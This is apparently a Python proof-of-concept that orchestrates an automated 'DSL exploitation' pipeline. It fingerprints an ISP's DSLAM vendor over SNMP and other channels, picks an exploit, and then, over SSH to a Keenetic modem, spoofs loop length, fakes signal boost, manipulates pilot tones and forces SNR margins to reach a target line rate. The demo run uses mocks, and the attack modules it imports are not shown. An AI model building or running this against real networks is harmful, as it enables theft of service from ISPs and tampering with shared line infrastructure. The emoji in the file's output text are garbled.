import logging
from unittest.mock import MagicMock

from src.dslam_detector import UniversalDSLAMDetector
from src.reporting import ReportGenerator
from src.database_manager import DatabaseManager
from src.vulnerability_scanner import VulnerabilityScanner
from src.advanced_dsl_physics import AdvancedDSLPhysics
from src.spoofing import KernelDSLManipulator
from src.keenetic_dsl_interface import KeeneticDSLInterface

class ExploitPipeline:
    """
    Orchestrates the end-to-end automated DSL exploitation process, from
    detection and scanning to exploit execution and validation.
    """

    def __init__(self, target_ip: str, community_string: str, signature_file: str, target_rate_mbps: float = 125.0, manipulation_strategy: str = 'static', loop_length: int = None, signal_boost: int = None, pilot_power: int = None):
        self.target_ip = target_ip
        self.community_string = community_string
        self.target_rate_mbps = target_rate_mbps
        self.manipulation_strategy = manipulation_strategy
        self.loop_length = loop_length
        self.signal_boost = signal_boost
        self.pilot_power = pilot_power
        self.ssh_interface = None  # Must be set before running
        self.final_report = {}

        logging.info(f"Initializing exploit pipeline with strategy: {self.manipulation_strategy}")
        self.db_manager = DatabaseManager(signature_file_path=signature_file)
        self.detector = UniversalDSLAMDetector(
            target_ip=self.target_ip,
            community_string=self.community_string,
            db_manager=self.db_manager,
            ssh_interface=self.ssh_interface
        )
        self.scanner = VulnerabilityScanner(self.db_manager)
        self.physics = AdvancedDSLPhysics(profile='17a') # Default profile
        logging.info("Pipeline components initialized.")

    def _execute_kernel_manipulation(self, exploit_info: dict) -> dict:
        """Handles kernel-level manipulation exploits based on the chosen strategy."""
        print(f"--- Executing Kernel Manipulation: {exploit_info['name']} with strategy '{self.manipulation_strategy}' ---")
        results = {}
        try:
            manipulator = KernelDSLManipulator(self.ssh_interface, profile='17a')

            # Apply additional manipulations if specified
            if self.loop_length is not None:
                results['loop_length_spoofed'] = manipulator.apply_loop_length_manipulation(self.loop_length)
            if self.signal_boost is not None:
                results['signal_boost_applied'] = manipulator.apply_fake_signal_boost(self.signal_boost)
            if self.pilot_power is not None:
                results['pilot_power_manipulated'] = manipulator.apply_pilot_tone_manipulation(self.pilot_power)

            # Execute the primary strategy
            if self.manipulation_strategy == 'static':
                target_distance_m = 50  # Assume a close distance for high speed
                strategy_results = manipulator.set_target_profile(
                    target_rate_mbps=self.target_rate_mbps,
                    target_distance_m=target_distance_m
                )
                results.update(strategy_results)
            elif self.manipulation_strategy == 'dynamic_reduce':
                strategy_results = manipulator.dynamically_reduce_snr(target_snr_floor_db=3.0)
                results.update(strategy_results)
            elif self.manipulation_strategy == 'adaptive':
                strategy_results = manipulator.adapt_to_line_quality(monitoring_duration_s=300)
                results.update(strategy_results)
            else:
                logging.error(f"Unknown manipulation strategy: '{self.manipulation_strategy}'")
                results.update({"error": f"Unknown strategy: {self.manipulation_strategy}"})

            return results
        except NotImplementedError as e:
            logging.error(f"A requested manipulation is not supported by the device's HAL: {e}")
            results.update({"error": "NotImplementedError", "details": str(e)})
            return results
        except Exception as e:
            logging.error(f"Kernel manipulation failed: {e}", exc_info=True)
            results.update({"error": str(e)})
            return results

    def _validate_outcome(self, execution_result: dict) -> bool:
        """Validates if the exploit was successful."""
        print("--- Validating Outcome ---")
        if not execution_result or execution_result.get("error"):
            print("‚ùå Validation Failed: Exploit execution resulted in an error.")
            return False

        # Check for success keys from any of the manipulation strategies
        if execution_result.get("snr_margin_set") is True or execution_result.get("success") is True:
            final_snr = execution_result.get('applied_snr_db') or execution_result.get('final_snr')
            print(f"‚úÖ Validation Successful. Final SNR: {final_snr:.1f} dB")
            return True

        print("‚ùå Validation Failed: Success condition not met.")
        return False

    def _configure_mocks(self):
        """Sets up all necessary mocks for a demonstration run."""
        print("[INFO] Configuring mocks for demonstration run...")

        # Mock the SNMP manager inside the detector to avoid real network calls
        self.detector.snmp_manager.get = MagicMock(return_value="1.3.6.1.4.1.2011") # Huawei sysObjectID

        # Mock non-SNMP analyzers
        ghs_analysis_mock = {"vendor_id": "HWTC", "vsi": b"MA5608T", "handshake_duration": 200}
        self.detector.ghs_analyzer.analyze_capture = MagicMock(return_value=ghs_analysis_mock)
        self.detector.dns_analyzer.get_hostname_by_ip = MagicMock(return_value="dslam-ma5608t.isp.com")
        self.detector.dhcp_analyzer.capture_and_analyze = MagicMock(return_value=None)
        self.detector.tr069_analyzer.capture_and_analyze = MagicMock(return_value=None)

        # If there's still an SSH interface, mock its command execution
        if self.ssh_interface and isinstance(self.ssh_interface, MagicMock):
            def mock_ssh_executor(command, timeout=None):
                logging.info(f"Mock SSH executing: '{command}'")
                if "cat /proc/device-tree/model" in command:
                    return "Keenetic Giga (KN-1010)", ""
                if "command -v xdslctl" in command:
                    return "/usr/bin/xdslctl", ""
                if "xdslctl configure --snr" in command:
                    return "", ""
                return "", ""
            self.ssh_interface.execute_command.side_effect = mock_ssh_executor

    def run(self):
        """Executes the full exploitation pipeline."""
        print("üöÄ Starting Automated Exploitation Pipeline üöÄ")

        # The detector's SSH interface is now set during its initialization
        self.detector.ssh = self.ssh_interface
        self._configure_mocks()

        # Step 1: Automated DSLAM Detection
        print(f"\n[Step 1] Running multi-method vendor identification for target: {self.target_ip}...")
        # We can now directly call the SNMP method without SSH
        detection_result = self.detector.identify_vendor(methods=['g_hs', 'snmp', 'dns', 'timing'])
        if not detection_result or 'primary_vendor' not in detection_result:
            print("‚ùå DSLAM detection failed. Aborting pipeline.")
            return
        vendor = detection_result['primary_vendor']
        print(f"‚úÖ DSLAM Detected: {vendor} with confidence {detection_result['overall_confidence']}%")
        self.final_report['detection'] = detection_result

        # Step 2: Vulnerability Scanning & Exploit Selection
        print("\n[Step 2] Scanning for vulnerabilities and selecting exploit...")
        selected_exploit = self.scanner.select_exploit(vendor, detection_result.get('capability_analysis', {}))
        if not selected_exploit:
            print("‚ùå No suitable exploit found. Aborting pipeline.")
            return
        print(f"‚úÖ Exploit Selected: {selected_exploit['name']}")
        self.final_report['exploit'] = selected_exploit

        # Step 3: Parameter Calculation is integrated into the execution step for this PoC.
        print("\n[Step 3] Parameter calculation will be performed during execution.")

        # Step 4: Exploit Execution
        print("\n[Step 4] Executing selected exploit...")
        execution_result = {}
        if selected_exploit['type'] == 'kernel_manipulation':
            execution_result = self._execute_kernel_manipulation(selected_exploit)
        else:
            print(f"‚ùå Exploit type '{selected_exploit['type']}' is not yet supported.")
            execution_result = {"error": "Unsupported exploit type"}
        self.final_report['execution'] = execution_result

        # Step 5: Validation and Rollback
        print("\n[Step 5] Validating exploit outcome...")
        is_successful = self._validate_outcome(execution_result)
        self.final_report['validation'] = {"success": is_successful}
        if not is_successful:
            print("[INFO] Rollback would be triggered here in a real scenario.")

        # Step 6: Reporting
        print("\n[Step 6] Generating final report...")
        self.report_generator = ReportGenerator(self.final_report)
        print("\n" + "="*20 + " FINAL TEXT REPORT " + "="*20)
        print(self.report_generator.generate_text_report())
        print("\n" + "="*20 + " FINAL JSON REPORT " + "="*20)
        print(self.report_generator.generate_json_report())

        print("\nüéâ Automated Exploitation Pipeline Complete üéâ")